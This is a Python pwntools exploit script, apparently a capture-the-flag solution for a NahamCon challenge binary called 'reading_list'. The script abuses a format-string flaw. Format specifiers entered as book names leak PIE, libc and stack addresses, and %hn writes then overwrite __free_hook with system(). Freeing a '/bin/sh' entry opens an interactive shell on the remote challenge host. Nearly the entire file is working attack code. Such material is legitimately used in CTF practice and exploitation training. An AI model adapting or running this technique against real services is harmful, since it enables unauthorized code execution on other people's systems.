#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challenge.nahamcon.com --port 31631 ./reading_list
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./reading_list')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challenge.nahamcon.com'
port = int(args.PORT or 32532)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *print_list+134
continue
c
c
c
c
c
c
c
c
c
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

if args.LOCAL:
    libc = exe.libc
    offset = 205
else:
    libc = ELF("./libc-2.31.so")
    offset = 205 + 0x26

libc = ELF("./libc-2.31.so")
offset = 205 + 0x26

def make_offset(addr, length=1):
    len_format = 2**(length*8)-1
    offset = []

    for i in range(int(8/length)):
       tmp = addr & len_format
       offset.append(tmp)
       addr >>= len_format.bit_length() # bit

    return offset

def add_book(name):
    io.sendlineafter(b"> ",b"2")
    io.sendlineafter(b": ",name.encode())

def read_book():
    io.sendlineafter(b"> ",b"1")

def delete_book(idx):
    io.sendlineafter(b"> ",b"3")
    io.sendlineafter(b": ",str(idx).encode())

def change_name(name):
    io.sendlineafter(b"> ",b"4")
    io.sendlineafter(b": ",name)

def write_addr(addr,to):
    length = 2

    off = make_offset(addr,length)
    print(off)

    p = '%{}x%22$hn'.format(off[0])
    add_book(p)
    p = '%{}x%23$hn'.format(off[1])
    add_book(p)
    p = '%{}x%24$hn'.format(off[2])
    p += 'DEAD'
    add_book(p)

    p = p64(to) 
    p += p64(to+2)
    p += p64(to+4)
    change_name(p)
 

io.sendlineafter(b": ",b"mantap")
add_book("%6$p")
add_book("%23$p")
add_book("%10$p")
read_book()
io.recvuntil(b"1. ")
exe.address = int(io.recvline(0),16) -0x11c0
print (hex(exe.address))
io.recvuntil(b"2. ")
libc.address = int(io.recvline(0),16) - offset - libc.sym['__libc_start_main']
print (hex(libc.address)) 

io.recvuntil(b"3. ")
stack = int(io.recvline(0),16) + 0x8
print (hex(stack)) 

bin_sh = next(libc.search(b"/bin/sh\x00"))
pop_rdi = next(libc.search(asm("pop rdi ; ret")))
system = libc.sym['system']
free_hook = libc.sym['__free_hook']
print (hex(bin_sh))
print (f"POP RDI : {hex(pop_rdi)}")
print (f"free_hook : {hex(free_hook)}")

delete_book(1)
delete_book(1)
delete_book(1)

write_addr(system,free_hook)
add_book("/bin/sh")

io.sendlineafter(b"> ",b"3")
io.recvuntil(b"DEAD")
io.sendlineafter(b": ",b"4")


io.interactive()

